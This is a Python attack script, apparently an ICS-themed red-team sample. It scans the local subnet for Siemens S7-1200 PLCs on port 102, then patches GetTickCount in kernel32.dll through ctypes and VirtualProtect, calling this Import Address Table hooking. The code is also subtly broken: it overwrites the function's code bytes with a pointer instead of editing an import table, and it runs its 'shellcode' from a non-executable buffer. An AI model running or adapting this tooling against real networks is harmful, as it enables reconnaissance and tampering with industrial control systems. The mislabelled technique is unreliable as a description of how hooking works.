import scapy.all as scapy
import socket
import struct
import ctypes
import sys
import os
from ctypes import wintypes
from time import sleep

# MITRE ATT&CK Execution: Hooking using IAT Hooking technique

def find_siemens_plc():
    """
    Scans the local network to find a Siemens S7-1200 PLC IP address.
    It looks for devices responding on TCP port 102 (S7Comm).
    """
    print("[+] Scanning network for Siemens S7-1200 PLC...")
    
    # Get local IP and subnet
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    subnet = local_ip.rsplit('.', 1)[0] + '.'

    for i in range(1, 255):
        target_ip = subnet + str(i)
        packet = scapy.IP(dst=target_ip) / scapy.TCP(dport=102, flags="S")

        response = scapy.sr1(packet, timeout=1, verbose=False)
        if response and response.haslayer(scapy.TCP) and response[scapy.TCP].flags == 18:  # SYN-ACK received
            print(f"[+] Siemens PLC found at {target_ip}")
            return target_ip

    print("[-] No Siemens PLC found.")
    return None


# Windows API hooking using IAT Hooking technique
kernel32 = ctypes.windll.kernel32

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("RegionSize", ctypes.c_size_t),
        ("State", wintypes.DWORD),
        ("Protect", wintypes.DWORD),
        ("Type", wintypes.DWORD),
    ]

def hook_iat(target_dll, target_function, hook_function):
    """
    Hooks a specific Windows API call by modifying the Import Address Table (IAT).
    """
    process = kernel32.GetModuleHandleW(None)
    if not process:
        print("[-] Failed to get process handle.")
        return False

    # Get module handle of the target DLL
    module_handle = kernel32.GetModuleHandleW(target_dll)
    if not module_handle:
        print(f"[-] Failed to get handle for {target_dll}")
        return False

    # Get address of the target function
    target_func_address = kernel32.GetProcAddress(module_handle, target_function.encode('utf-8'))
    if not target_func_address:
        print(f"[-] Failed to get address for {target_function}.")
        return False

    print(f"[+] Found {target_function} at {hex(target_func_address)} in {target_dll}")

    # Modify memory protection to allow writing
    mbi = MEMORY_BASIC_INFORMATION()
    kernel32.VirtualQuery(ctypes.c_void_p(target_func_address), ctypes.byref(mbi), ctypes.sizeof(mbi))

    old_protect = wintypes.DWORD()
    kernel32.VirtualProtect(ctypes.c_void_p(target_func_address), ctypes.sizeof(ctypes.c_void_p), 0x40, ctypes.byref(old_protect))  # PAGE_EXECUTE_READWRITE

    # Replace function address with the new hook
    hook_func_ptr = ctypes.cast(hook_function, ctypes.c_void_p).value
    ctypes.memmove(target_func_address, ctypes.byref(ctypes.c_void_p(hook_func_ptr)), ctypes.sizeof(ctypes.c_void_p))

    # Restore memory protection
    kernel32.VirtualProtect(ctypes.c_void_p(target_func_address), ctypes.sizeof(ctypes.c_void_p), old_protect, ctypes.byref(wintypes.DWORD()))

    print(f"[+] Hooked {target_function} in {target_dll}")
    return True

# Example Hook Function
HOOK_CODE = b"\x90\x90\x90\xC3"  # NOP NOP NOP RET (safe stub)

def create_hook_function():
    """Creates a shellcode buffer in memory and returns its pointer."""
    shellcode = (ctypes.c_char * len(HOOK_CODE)).from_buffer_copy(HOOK_CODE)
    hook_func_ptr = ctypes.cast(shellcode, ctypes.c_void_p).value
    return hook_func_ptr

if __name__ == "__main__":
    plc_ip = find_siemens_plc()
    if plc_ip:
        print(f"[+] Proceeding with hooking after identifying PLC at {plc_ip}...")

        # Example: Hook "GetTickCount" in "kernel32.dll"
        target_function = "GetTickCount"
        target_dll = "kernel32.dll"

        hook_function = create_hook_function()
        if hook_function:
            hook_iat(target_dll, target_function, hook_function)
        else:
            print("[-] Failed to create hook function.")
    else:
        print("[-] Exiting. PLC IP not detected.")